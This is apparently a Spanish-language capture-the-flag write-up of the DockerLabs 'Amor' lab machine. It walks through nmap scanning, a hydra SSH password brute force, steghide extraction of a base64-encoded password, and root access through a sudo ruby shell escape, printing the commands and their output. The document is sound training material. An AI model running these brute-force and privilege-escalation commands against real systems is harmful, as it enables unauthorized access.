# Maquina Amor (DockerLabs)
<img width="502" height="334" alt="Banner" src="https://github.com/user-attachments/assets/45bc00cd-7fbf-4f94-8607-706aa2c2c447" />

## Fase de Reconociemiento
Con lo que empiezo siempre es con un escaneo de puertos rapidos con NMAP:

```bash
# nmap -p- -n -v -Pn 172.17.0.2 -oN scan-basic
---
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Puedo observar que tanto el puerto 22 (SSH) y el puerto 80 (http) están abiertos. Lo siguiente que me propongo es obtener mas información de esos puertos, los servicios y versiones:

```bash
# nmap -p22,80 -sVC 172.17.0.2 -oN scan-full
---
Nmap scan report for 172.17.0.2
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: SecurSEC S.L
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Puerto 22: OpenSSH 9.6p1 Ubuntu 3ubuntu13
- Puerto 80: Apache httpd 2.4.58

Con esta información me doy cuenta que las versiones de los servicios son relativamente recientes.  
  
Me dispongo, entonces, a buscar información dentro de la **Página WEB de Apache** que contiene el servidor, la página contiene varios mensajes parecidos a los de un archivo de logs. Entre ellos hay un mensaje donde puedo sospechar un posible usuario, o incluso que dos:
  
<img width="980" height="177" alt="Usuario" src="https://github.com/user-attachments/assets/816165ef-a912-4746-9343-1b7aa082a11a" />

## Fase de Explotación
Como no encuentro otra vulnerabilidad investigando la página, decido utilizar la herramienta `hydra` para hacer fuerza bruta con uno de los usuarios que he detectado:
```bash
> hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
---
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
```
- La contraseña es: **babygirl**

Procedo a entrar al servidor con el usuario **carlota** y el password **babygirl**:  
```bash
> ssh carlota@172.17.0.2
```

### Escala de privilegios
Una vez dentro del servidor, decido explorar un poco por los directorios donde tiene permisos el usuario **carlota**.  
Información que logro ver:
- Dentro del directorio '/home' veo otro usuario **oscar**.
- Logro ver un mensaje en el contenido del archivo '.bashrc', en el que dice:
```bash
export SECRET="Hola oscar, recuerdas las  \"vacaciones\" que pasamos juntos? En el interior de nuestro amor hay un secreto. ¿Entiendes?"
```
- Exploro el directorio '/vacaciones/' hasta encontrar una imagen, decido descargarmela en mí máquina:
```bash
> scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .
```
Buscando formas de sacar información de la imagen, descubro y decido usar la herramienta `stgehide`. Es una herramienta de esteganografía y sirve para ocultar datos dentro de archivos como imágenes o audio.
```bash
> steghide --extract -sf imagen.jpg
> cat secret.txt
---
ZXNsYWNhc2FkZXBpbnlwb24=
```
Extrajo una cadena de caracteres que te deja pensar que es un password. Descubrí que estaba codificado en base64:
```bash
> echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d > pass-image.txt
> cat pass-image.txt
---
eslacasadepinypon
```
Como anteriormente descubrí que en el servidor también se encontraba el usuario **oscar**, comprobé si la contraseña le pertenecía a ese usuario:
```bash
> ssh oscar@172.17.0.2
```
El password es del usuario **oscar**, pude entrar en la maquina como **oscar** y lo primero que comprobé fué los privilegios como sudo que tiene:
```bash
> sudo -l
---
User oscar may run the following commands on 31e119053bcc:
    (ALL) NOPASSWD: /usr/bin/ruby
```
Se puede ver que el usuario oscar puede ejecutar comando del sistema utilizando ruby. Decidí buscar una comanda en GTFOBins y ejecutarla:
```bash
> sudo ruby -e 'exec "/bin/sh"'
> whoami
---
root
```

## Comentarios
Es la segunda máquina que realizo en DockerLabs de dificultad Fácil y siento que he controlado bastante el proceso. En esta CTF he descubierto la herramienta stgehide y he aprendido para qué sirve y como utilizarla.
